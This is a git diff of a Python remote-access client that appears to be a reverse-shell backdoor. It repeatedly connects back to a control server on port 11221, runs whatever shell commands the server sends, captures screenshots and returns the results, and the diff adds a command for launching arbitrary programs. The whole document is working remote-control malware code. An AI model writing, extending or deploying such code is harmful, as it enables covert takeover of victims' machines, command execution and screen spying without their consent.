@@ -25,11 +25,14 @@ def screenshot():
     with mss() as screenshot:
         screenshot.shot()
 
-def connection_loop(sock):
+def connection_loop():
     MAX_TRIES = 100
+    PORT = 11221
     for i in range(MAX_TRIES):
         try:
-            sock.connect(("0.0.0.0", 11221))
+            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            print(f"Trying to connect to server on port {PORT}")
+            sock.connect(("", PORT))
             print("Connected to server")
             shell(sock)
         except: 
@@ -37,6 +40,9 @@ def connection_loop(sock):
             print("Retrying...")
             time.sleep(10)
             continue
+        finally:
+            sock.close()
+
     print("Maximum tries reached, shutting down client now.")
 
 def shell(sock):
@@ -86,6 +92,13 @@ def shell(sock):
                 os.remove("monitor-1.png")
             except:
                 utils.reliable_send(sock, "SCREENSHOT_FAIL")
+        elif cmd[:5] == "start":
+            try:
+                subprocess.Popen(cmd[6:], shell=True)
+                result = "Program started!"
+            except Exception as e:
+                print(e)
+                result =f"Error while trying to start '{cmd[6:]}'"
         else:
             proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.PIPE,
                                     stderr=subprocess.PIPE, stdin=subprocess.PIPE)
@@ -93,9 +106,8 @@ def shell(sock):
         utils.reliable_send(sock, result)
 
 def main():
-    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-    connection_loop(sock)
-    sock.close()
+    connection_loop()
+
 
 if __name__ == "__main__":
     main()
